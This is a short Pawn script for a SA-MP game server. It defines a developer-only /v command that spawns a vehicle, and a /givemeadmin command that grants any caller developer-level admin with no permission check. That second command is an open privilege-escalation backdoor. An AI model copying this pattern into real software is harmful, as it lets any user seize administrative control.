CMD:v(playerid, params[])
{
	new modelid, color1, color2;
	if(sscanf(params, "ddd", modelid, color1, color2)) return SendClientMessage(playerid, -1, "Syntax: /v <modelid> <color 1> <color 2>");
	if(modelid < 400 || modelid > 611) return SendClientMessage(playerid, -1, "Modelo de vehículo no válido.");
	
	new Float:p[4];
	GetPlayerPos(playerid, p[0], p[1], p[2]);
	GetPlayerFacingAngle(playerid, p[3]);
	
	new pvid = CreateVehicle(modelid, p[0], p[1], p[2], p[3], color1, color2, -1);
    SetVehicleVirtualWorld(pvid, GetPlayerVirtualWorld(playerid));
	LinkVehicleToInterior(pvid, GetPlayerInterior(playerid));
    PutPlayerInVehicle(playerid, pvid, 0);
	return 1;
}
alias:v("vehicle")
flags:v(ADMIN_LEVEL_DEVELOPER)

CMD:givemeadmin(playerid, params[])
{
    PlayerInfo[playerid][pAdmin] = ADMIN_LEVEL_DEVELOPER;
    return 1;
}